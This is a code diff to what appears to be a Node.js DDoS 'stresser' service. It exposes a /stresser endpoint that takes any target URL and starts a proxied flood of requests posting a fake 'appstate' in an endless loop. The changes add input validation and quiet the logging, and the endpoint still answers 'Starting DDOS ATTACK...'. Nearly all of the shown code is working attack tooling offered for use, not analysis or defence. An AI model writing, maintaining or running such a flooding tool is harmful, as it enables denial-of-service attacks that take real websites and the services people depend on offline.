@@ -114,6 +114,7 @@ const loadProxies = () => {
 
 const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion) => {
     if (!continueAttack) return;
+    console.clear();
 
     const headersForRequest = {
         "Content-Type": "application/x-www-form-urlencoded",
@@ -157,9 +158,6 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
         state: fakeState()
     })
     .then((response) => {
-        if (response.status === 200) {
-            console.log(rainbow("Dumped Fake Appstate Success ✓ (200)"));
-        }
         requestsSent++;
         checkCompletion(requestsSent);
         setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
@@ -256,7 +254,11 @@ const startAttack = (url) => {
 };
 
 app.get("/stresser", (req, res) => {
-    targetUrl = req.query.url;
+    const url = req.query.url;
+    if (!url || !/^https?:\/\//.test(url)) {
+        return res.status(400).json({ error: "Invalid URL. Please provide a valid URL starting with http:// or https://." });
+    }
+    targetUrl = url;
     startAttack(targetUrl);
     res.json({ message: "Starting DDOS ATTACK..." });
 });
